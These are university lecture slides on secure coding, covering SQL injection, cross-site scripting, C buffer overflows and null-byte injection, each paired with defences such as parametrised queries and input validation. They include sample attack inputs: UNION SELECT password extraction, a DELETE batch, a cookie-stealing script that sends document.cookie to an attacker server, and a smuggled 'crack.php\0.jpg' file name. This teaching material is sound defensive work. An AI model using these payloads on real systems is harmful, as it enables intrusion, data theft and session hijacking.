Secure Development: Coding Security 1. SQL Injection 2. Output Handling --- 3. Programming Languages Problem 4. Java Security 5. Java Security Demo 1 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 571 -->

Lecture 6 - Review CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 2


<!-- Page 572 -->

Main points to take home Ø A big picture of digital cash and Bitcoin as a cryptocurrency § Digital Cash, proposed by David Chaum § Bitcoin vs Traditional Banking System vs Digital Cash Ø Some cryptographic functions and Data structures used in Bitcoin § Message Digest / Hash function § Public key cryptography with Digital Signature § Linked List, Binary Tree, and Merkle Tree CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 3


<!-- Page 573 -->

Main points to take home Ø A big picture of digital cash and Bitcoin as a cryptocurrency § Digital Cash, proposed by David Chaum § Bitcoin vs Traditional Banking System vs Digital Cash Ø Some cryptographic functions and Data structures used in Bitcoin § Message Digest / Hash function § Public key cryptography with Digital Signature § Linked List, Binary Tree, and Merkle Tree CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 4


<!-- Page 574 -->

Main points to take home We have learned about the Bitcoin Protocol, which underpins the Blockchain technology Ø Bitcoin Addresses Ø Bitcoin Distributed Ledger: a chain of Blocks Ø Transactions in Bitcoin and Blockchain Ø Consensus Mechanism: Proof - of - Work 5 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK CRYPTOGRAPHY AND SECURE DEVELOPMENT


<!-- Page 575 -->

Main points to take home We have also learned about Bitcoin Security and Privacy Ø Authentication à Public Key Crypto & Digital Signatures § Am I paying the right person? Not some other impersonator? Ø Availability à Broadcast messages to the P2P network § Can I make a transaction anytime I want? Ø Integrity à Digital Signatures & Cryptographic Hash § Is the coin double - spent? § Can an attacker reverse or change transactions? Ø Confidentiality à Pseudonymity § Are my transactions private? Anonymous? 6 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 576 -->

Lecture 7 Coding and Security CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 7


<!-- Page 577 -->

Outline 1. SQL Injection 2. Output Handling --- 3. Programming Languages Problem 4. Java Security 5. Java Security Demo The book “ Innocent Code ” by Sverre Huseby has many useful examples. CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 8


<!-- Page 578 -->

SQL Injection CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 9


<!-- Page 579 -->

Web Application Architecture 10 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK https://mobidev.biz/blog/web - application - architecture - types


<!-- Page 580 -->

Passing Data to Subsystem 11 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Many applications pass data to subsystems. § SQL database. § Operating system. § Command interpreters. Ø Often this is done by building strings and passing them to the subsystem . § The subsystem then parses the strings to extract meaning. Ø Most of the content of the string is just plaintext, or data. Ø Occasionally the string will contain characters with special meanings called meta - characters. § An attacker can pass meta - characters as plaintext.


<!-- Page 581 -->

SQL Injection: Ideas 12 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Many systems pass SQL queries to a database subsystem. Ø The queries are often constructed from user input . Ø These queries will contain meta - characters which can be misused by an attacker. § For example, ' will switch from command mode to input mode and vice versa. § A user can put ' in their input, getting SQL to switch to command mode. § They have injected a command into the SQL system.


<!-- Page 582 -->

SQL with Meta - characters: Example 13 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø We have a SQL table called User with a column called RealName . Ø We have a program that gets the name from the user and stores it in the Java String variable name . Ø We construct a query string in Java by: String query = “INSERT INTO User ( RealName ) VALUES ('” + name + “')”; Ø I f name c on t ai ns Nguyen Truong t h e n t he q u e ry b e c o m es : INSERT INTO User ( RealName ) VALUES (‘Nguyen Truong') Ø And everything works fine.


<!-- Page 583 -->

SQL with Meta - characters: Example 14 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø If John O’Donnell entered his name into the system, the query would become: INSERT INTO User ( RealName ) VALUES ( ' John O ' Donnell ’ ) Ø This will not work because SQL thinks the name is John O and the text after the second ' causes an error.


<!-- Page 584 -->

SQL Injection Attack – Comment out 15 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø We are using a database called User that stores usernames and passwords in columns called UserName and Password . Ø A login page will get the relevant information from the user and store in two variables user and pass . Ø We then construct a query string in Java to access the database. String Query = "SELECT * FROM User " + "WHERE UserName ='" + user +"' " + "AND Password=‘" + pass + “’”; Ø This only returns a row if the user entered username and password are correct. § Warning: this is not a good way to check passwords.


<!-- Page 585 -->

SQL Injection Attack – Comment out 16 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø If the input text was “ Nguyen ” and “ abcdefgh ” then the query submitted to the database would be: SELECT * FROM User WHERE UserName =‘Nguyen' AND Password=' abcdefgh ’ Ø This would work as expected. Ø On the other hand, if the input for name was “ Nguyen' -- " and the password was empty (or any) , the generated SQL would be: SELECT * FROM User WHERE UserName =‘Nguyen’ -- ' AND Password=‘’ Ø The -- introduces a SQL comment , which invalidates the password check, provided there is a user called Nguyen . Ø The user gets in without knowing the password!


<!-- Page 586 -->

SQL Injection Attack – Comment out 17 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 587 -->

SQL Injection Attack Demo 18 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK https://www.codingame.com/playgrounds/154/sq l - injection - demo/sql - injection


<!-- Page 588 -->

SQL Injection Attack – Boolean Precedence 19 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Some databases such as Access do not recognise SQL comments. In this case we can use the Precedence of Boolean connectives to bypass the password check. Ø Enter user Nguyen' OR 'a'='b and leave password blank (or any). This becomes: SELECT * FROM User WHERE UserName =‘Nguyen’ OR 'a'='b' AND Password=‘’ Ø AND has a higher precedence than OR, and both parts of the AND are false, leading to: SELECT * FROM User WHERE UserName =‘Nguyen' OR FALSE Ø But only one part of the OR needs to be true!


<!-- Page 589 -->

SQL Injection Attack Demo 20 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK https://www.codingame.com/playgrounds/154/sq l - injection - demo/sql - injection


<!-- Page 590 -->

How to store Users’ passwords 21 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 591 -->

How to check Users’ passwords 22 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 592 -->

SQL Injection: Batched SQL Statements with Semicolon 23 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø This query looks up a customer in a table based on an integer customer ID, stored in a string cust . String Query = "SELECT * FROM Customer WHERE CustID =" + cust Ø There is no ' , but consider the following cust string: 1; DELETE FROM Customer Ø The ; character is used to run SQL commands in batch mode , one after the other.


<!-- Page 593 -->

SQL Injection: Batched SQL Statements with Semicolon 24 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø This is faithfully translated as the string: SELECT * FROM Customer WHERE CustomerID =1; DELETE FROM Customer Ø SQL will expect an integer for CustomerID and will recognise the ; following the 1 as terminating the input, going back to command mode and deleting customer 1. Ø Not all databases support batch mode.


<!-- Page 594 -->

SQL Injection with UNION SELECT 25 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Now let us try and get information out of a database. Ø We cannot just inject a SELECT statement in our input data, because that would return more than one result sets. Ø UNION SELECT will combine the results sets so that we can mix sensitive data with genuine data that we are allowed to access. Ø In this example we have a second table called Customers contains columns: CustomerID , CustomerName , ContactName and Address . Ø A query for accessing a customer according to a numeric category would be: String Query = "SELECT CustomerName , ContactName , Address FROM Customers WHERE CustomerID =" + custID ; Ø Obtain all items related to a customer in a given ID.


<!-- Page 595 -->

SQL Injection with UNION SELECT 26 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Now let custID contain: 1 UNION SELECT ‘a’ ,UserName,Password from Users Ø The query as seen by SQL is: SELECT CustomerName , ContactName , Address FROM Customers WHERE CustomerID =1 UNION SELECT ‘ a’ , UserName,Password from Users Ø We get the items from customerID = 1 together with all the usernames and passwords. Ø The ‘a’ is there to make sure that the second SELECT produces a results set with the same form as the first : ( string, string, string) . Try out: https://www.w3schools.com/sql/trysql.asp?filename=trysql_view1


<!-- Page 596 -->

SQL Injection: Sub - Queries 27 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø We can inject complete SQL commands as sub - queries, potentially doing a lot of damage. Ø This example runs a SQL statement to update a user’s address based on the user input. Ø It is in a Java program. § Address is a Java String. § userId is an Integer. Query="UPDATE Users SET Address='"+address+"' " + "WHERE UserID ="+ userId


<!-- Page 597 -->

SQL Injection: Sub - Queries 28 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø We enter the following address: ' || (SELECT Password FROM Users WHERE username=‘Nguyen') || ' § || concatenates strings. Ø If the attacker’s user ID is 1234 then the query becomes: UPDATE Users SET Address='' || (SELECT Password FROM Users WHERE username='Nguyen') || '' WHERE UserID =1234 Ø The attacker’s address will now contain Nguyen’s password! Ø We can make the same attack using SQL Injection with Batched SQL Statements using ; in systems that support batch operations.


<!-- Page 598 -->

SQL Injection: URL parameters 29 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Here is a real - life example of injecting code into a SQL query. Ø A payment system web page could be accessed with the URL: § http://pay.example/default.asp?id=3;SHUTDOWN Ø The string 3;SHUTDOWN was injected into the SQL as the id number and duly shut down the database, several times. Ø This suggestion was made in a discussion group, and the person making the suggestion, together with the unbelievers who tried it out; and it worked. Not long after, they were visited by the police. Ø Note that I am not making a suggestion, merely reporting something that is public knowledge!


<!-- Page 599 -->

SQL Injection: Obtaining Info. Helpful Error Messages 30 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø The previous attacks have relied on knowing the names of the tables and columns. Ø This can often be obtained from helpful error messages . § Discovered by David Litchfield in his paper: § Web Application Disassembly with ODBC Error Messages ( http://www.davidlitchfield.com/WebApplicationDisassemblywithOD BCErrorMessages.pdf ) § An attempt to access an invalid column can result in an error message that lists all the columns in the table being attacked. § Alternatively, columns can be obtained one by one.


<!-- Page 600 -->

Error Messages: An Example 31 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø The following parameters were appended to a URL: ?id=1+OR+qwe=1 § + is the URL code for a space character . Ø So, the id parameter is: id=1 OR qwe =1 § There is no column called qwe . § The underlying system used ODBC (a C version of JDBC) to access the database, and ODBC provided a helpful error message that listed all the columns in the table being accessed. Ø This was done in the ODBC library and not the programmer’s code. Ø Making it hard to avoid. Ø The moral here is to avoid helpful error messages for users that could also be seen by an attacker.


<!-- Page 601 -->

SQL Injection: Obtaining Info. Using GROUP to get Columns 32 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Assume the underlying application constructs the query: "SELECT * FROM News WHERE id=" + id Ø Attacker enters id as 1 HAVING 1=1 for the id to produce: SELECT * FROM News WHERE id=1 HAVING 1=1 Ø The error message is: “ Attribute news.id must be GROUPed or used in an aggregate function ”. Ø This tells the attacker the table is called News and that the first column is id . Ø Try again with 1 GROUP BY id HAVING 1=1 Ø The error message then says that the next column is Title . Ø Repeat until there are no error message to get all the columns.


<!-- Page 602 -->

SQL Injection CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 33


<!-- Page 603 -->

Solution 34 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Input Validation or Sanitization Ø Parametrised queries Ø Stored Procedures


<!-- Page 604 -->

Unchecked Meta - character 35 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø The problem is not the -- comment in SQL nor the Boolean Precedence. Ø The problem is in the Java program which has allowed the metacharacter ' to be entered as data. § When SQL parses its query, it used the first ' to switch from command mode to data mode . § The second ' switches back to command mode , and so on. § This has allowed us to enter commands as data. Ø This is a tricky problem because ' can be a valid part of a name. § O'Donnell, for example.


<!-- Page 605 -->

Input Validation 36 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Validation shouldn't only be applied to fields that allow users to type in input § You should also take care of the following situations in equal measure: Ø Use regular expressions as whitelists for structured data (such as name, age, income, survey response, zip code) to ensure strong input validation. Ø In case of a fixed set of values (such as drop - down list, radio button), determine which value is returned. § The input data should match one of the offered options exactly.


<!-- Page 606 -->

Input Validation 37 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø The validation process is aimed at verifying whether or not the type of input submitted by a user is allowed. Ø Input validation makes sure it is the accepted type, length, format, and so on Ø Different Approaches § Escaping meta - characters § Reject bad inputs § Accept only good inputs


<!-- Page 607 -->

Parametrised Query 38 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Parametrised queries are a means of pre - compiling an SQL statement so that you can then supply the parameters in order for the statement to be executed. Ø This method makes it possible for the database to recognise the code and distinguish it from input data. Ø The user input is automatically quoted and the supplied input will not cause the change of the intent Ø Thus, this coding style helps mitigate an SQL injection attack.


<!-- Page 608 -->

Parametrised Query: Example 39 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 609 -->

Stored Procedures 40 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Similar to Parametrised Queries § Input values are passed as parameters § Inputs are as string literals in SQL and NOT as a part of the SQL query Ø Differences: Ø Stored Procedures are executed at DBMS, stored and associated to a schema in DBMS Ø Each query is processed more rapidly than a straight query, because the server pre - compiles them. Ø Each query need only be written once. It can be executed as many times as needed, even across different sessions and different connections. Ø Allows queries to include programming constructs (such as loops, conditional statements, and error handling) that are either impossible or difficult to write in SQL alone.


<!-- Page 610 -->

SQL Injection Summary Ø Concept of passing data to sub - system Ø Different types of SQL Injection attacks § Comment out § Boolean Precedence § Batched SQL statements using Semicolon § Union Select § Sub - Queries § URL parameters Ø Obtain Information for SQL injection attacks § Helpful Error Messages Ø Prevention Methods Ø Input validation & sanitization Ø Parametrised Query Ø Stored Procedures 41 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 611 -->

Quiz 42 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 1. Give two examples of a SQL injection attack and state what coding standards are necessary to defeat this attack. 2. Show how UNION SELECT and Sub Queries can be used to run an attacker’s SELECT statement on a target machine. 3. How can details of the database tables on the target machine be found?


<!-- Page 612 -->

Lecture 7 Coding and Security CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 1


<!-- Page 613 -->

Outline 1. SQL Injection 2. Output Handling --- 3. Programming Languages Problem 4. Java Security 5. Java Security Demo The book “ Innocent Code ” by Sverre Huseby has many useful examples. CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 2


<!-- Page 614 -->

Output Handling in Web App CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 3


<!-- Page 615 -->

Output Handling 4 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø In a web application the server eventually passes data back to the browser running on the client’s machine. Ø If an attacker can insert malicious code, then it will be executed by the client’s browser. § This is a form of passing data to a subsystem. § There is a longer round trip, with data originating on the client’s machine, being passed to the server, and then appearing again in potentially a different client’s browser. Ø This is called Cross - Site Scripting (XSS) . Ø The malicious code will be HTML. Ø Typically, inside the tag: <script> . . . </script>


<!-- Page 616 -->

5


<!-- Page 617 -->

6


<!-- Page 618 -->

HTML Injection 7 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Sometimes user input is used to create a HTML code that is then executed. § Any HTML tags to be executed Ø If the user input is <script>something</script> then we have injected a command into the system. § Insert JavaScript snippets Ø We can check for script, but HTML tags are not case sensitive and so we should reduce to lower case before checking. § To catch < ScRiPt >


<!-- Page 619 -->

XSS: More Malicious Example 8 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø What if the attacker entered the following as their name: <script> for (q = 0; q < 1000; q++) window.open (‘some dodgy website’); </script> Ø Listing the guests will try and open 1000 popup windows with dodgy content! Ø The <script> tag introduces JavaScript code.


<!-- Page 620 -->

Session Hijacking 9 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø XSS can be used to hijack a user’s session, in other words, impersonate them. § Sessions are normally maintained by cookies. § When a session starts, the server sends a cookie to the client. § The client returns the cookie to the server every time is communicates with it. § The server then know which client, out of many, is making the new request. Ø If the attacker can get the cookie, they can become the person attacked. Ø The communications between the client and server is unique. § The attacker must trick the server into sending malicious code to the victim.


<!-- Page 621 -->

Session Hijacking 10 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Let us assume the web site lets users add comments, and all users can see the comments of other users. Ø The attacker adds a comment that includes a script that connects to another server run by the attacker. Ø When the victim reads the comments, they are redirected to the attacker’s website. § Their cookie is sent to the attacker’s website in the usual way. § The attacker can then grab it. Ø The attacker’s website then redirects the user back to the original site. § The victim just notices a slight flicker. Ø The attacker can then connect to the original server, pretending to be the victim.


<!-- Page 622 -->

Simplified Hijack Script 11 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø The victim receives a HTML web - page with the embedded script. <script> document.location.replace (“ attacker_server ” +”? what =“ + document.cookie ) </script> Ø The replace line switches to the attacker’s server. Ø The attack program has one parameter called what with the cookie as its value. Ø Going back to the original website and preventing an infinite loop introduces some additional complexity.


<!-- Page 623 -->

XSS Attacks Categories 12 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø XSS attacks can be categorized in three main types: 1. Stored (Persistent) Cross - Site Scripting § When a malicious script is being saved on the webserver permanently 2. Reflected (Non - Persistent) Cross - Site Scripting § When a malicious script is not being saved on the webserver but reflected in the website’s results 3. DOM - Based Cross - Site Scripting. § When the DOM environment is being changed, but the code remains the same.


<!-- Page 624 -->

Preventing XSS 13 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Validate output (HTML) just before it is sent to the client. Ø The attack script might have come from several places, and we might not check all of them. Ø Disabling JavaScript in web - pages is a drastic step that still might not work. Ø If an attacker has injected code of the form: < scr <script> ipt > Ø Then eliminating <script> will still leave <script> !


<!-- Page 625 -->

XSS Demo 14 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 626 -->

XSS Attacks 15 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Stored XSS Example: <script>alert(‘Nguyen Truong')</script>


<!-- Page 627 -->

XSS Attacks 16 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Reflected XSS <script>for (q = 0; q < 10; q++) window.open (‘http://google.com’);</script>


<!-- Page 628 -->

XSS Attacks 17 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Cookie Hijacking <script>fetch(' http://localhost/xss - demo /log.php?c=' + document.cookie )</script>


<!-- Page 629 -->

Output Handling Summary Ø It is Cross Site Scripting (XSS) § Inject webapp with malicious script Ø HTML/JavaScript Injection Ø Session Hijacking 18 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 630 -->

Quiz 19 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 4. How can JavaScript be run on a target machine? 5. How can a session be hijacked using Cross Site Scripting?


<!-- Page 631 -->

Lecture 7 Coding and Security CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 1


<!-- Page 632 -->

Outline 1. SQL Injection 2. Output Handling --- 3. Programming Languages Problem § C/C++ Buffer Overflow § Poisoned Null Byte / Null Byte Injection 4. Java Security 5. Java Security Demo CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 2


<!-- Page 633 -->

Programming Languages Security Threats CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 3


<!-- Page 634 -->

C/C++ Buffer Overflow Ø C and C++ do not automatically check to see if we exceed an array bound. § The philosophy is that programmer does not pay for what he doesn’t use. This makes the program faster. § If array bound checking is important it must be done by the programmer. Ø A program that takes a user defined string and stores it in a char array (a buffer) can overwrite other arrays if the size of the string is not checked and the user provides an extra long string. Ø This can cause the common buffer overflow attack. Ø It can be prevented by explicitly checking the length of any input string. 4 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 635 -->

C/C++ Memory Allocation Ø C and C++ allocate memory using stack (at compile time) or heap (at run time). Ø For instance: § To declare a variable on the stack: int numberPoints = 10; § On the heap: int* ptr = malloc (10 * sizeof (int)); Ø In general, stack overflow is more common than heap overflow 5 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 636 -->

Original UNIX Password Checking Ø Assume the memory is laid out sequentially as: 6 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK user pwd epwd uepw d □ □ □ □ □ □ □ □ □ □ □ □ □ □ □ □ □ □ □ □ □ □ □ □ □ □ □ □ □ □ □ □


<!-- Page 637 -->

Ø Assume the login process is: 1. Read in username and store it in user 2. Lookup the encrypted password and store it in epwd 3. Read in the user supplied password and store it in pwd 4. Encrypt the user supplied password, storing it in uepwd 5. Check if uepwd and epwd are the same. 7 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Original UNIX Password Checking


<!-- Page 638 -->

Ø I want to log in as root , but don’t know the root password. § The encrypted value of the root password is !”£$%^&* . Ø I do know that password abcdefgh is encrypted to stuvwxyz . Ø I enter root for the user, and abcdefghstuvwxyz for the password. Ø After steps 1 and 2, the memory contains 8 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK user pwd epwd uepw d r o o t □ □ □ □ □ □ □ □ □ □ □ □ ! ” £ $ % ^ & * □ □ □ □ □ □ □ □ Original UNIX Password Checking


<!-- Page 639 -->

Ø After step 3, the overlong password has overflowed from pwd to epwd , overwriting the value for root . 9 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Original UNIX Password Checking Ø Step 4 then encrypts abcdefgh to produce stuvwxyz and epwd and uepwd are the same. user pwd epwd uepw d r o o t □ □ □ □ a b c d e f g h s t u v w x y z □ □ □ □ □ □ □ □ user pwd epwd uepw d r o o t □ □ □ □ a b c d e f g h s t u v w x y z s t u v w x y z


<!-- Page 640 -->

Ø To understand how a buffer overflow occurs, let’s look at the following code, which performs a simple password check, and is susceptible to a buffer overflow attack: Ø Online compiler: https://www.programiz.com/cpp - programming/online - compiler/ 10 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK C/C++ Password Checking Demo


<!-- Page 641 -->

Buffer Overflow Prevention Ø Again, it can be prevented by explicitly checking the length of any input string. Ø We might use managed buffers like std::vector or std::string § We lose our bounds - checking abilities as soon as we interface with C - style APIs that force us to pass vector::data or string:: c_str . Ø Coding Practices: § The best way to prevent buffer overflows is to use APIs that aren’t vulnerable. In C++, we use managed buffers and strings rather than raw arrays and pointers. 11 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 642 -->

Buffer Overflow Prevention § gets() - > fgets () - read characters § strcpy () - > strncpy () - copy content of the buffer § strcat () - > strncat () - buffer concatenation § sprintf () - > snprintf () - fill buffer with data of different types § (f) scanf () - read from STDIN § getwd () - return working directory § realpath () - return absolute (full) path Use safe equivalent functions, which check the buffers length, whenever it’s possible. 12 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 643 -->

Ø C and C++ use a null byte ( ‘ \ 0’ ) to terminate a string. § “Bob” is stored as ‘B’ ‘o’ ‘b’ ‘ \ 0’ Ø Other program languages (e.g., Python) provide an explicit length parameter for strings. § “Bob” is stored as ‘3’ ‘B’ ‘o’ ‘b’ Ø This mismatch means that we can use one language to explicitly include a null character in a string that is passed to a C or C++ program. 13 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK C/C++ Poisoned null byte


<!-- Page 644 -->

Ø For example, we might want to create a directory of images on an Apache server using PHP. Ø The client is passed the name of an image file and a Python routine checks that the file either ends with .jpg or . png . Ø The file is then passed to the server and processed. Ø We can construct a file that contains attack code with a filename § 14 c r a c k . p h p \ 0 . j p g § Python will accept it as an image file . § c r a c k . p h p \ 0 . j p g will be passed to the server. § The server will see the string c r a c k . p h p interpret it as a . php program file and run it. 14 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK C/C++ Poisoned null byte


<!-- Page 645 -->

Rules for Secure Coding CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 15


<!-- Page 646 -->

Ø Parameters are passed in the clear and can be changed by an attacker, who can resend the page. Ø The browser can repeat a GET request whenever it wants. § If the user clicks the back button. Ø This will have problems if the parameters change things on the server. § Making the same payment twice. 16 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Use POST rather than GET


<!-- Page 647 -->

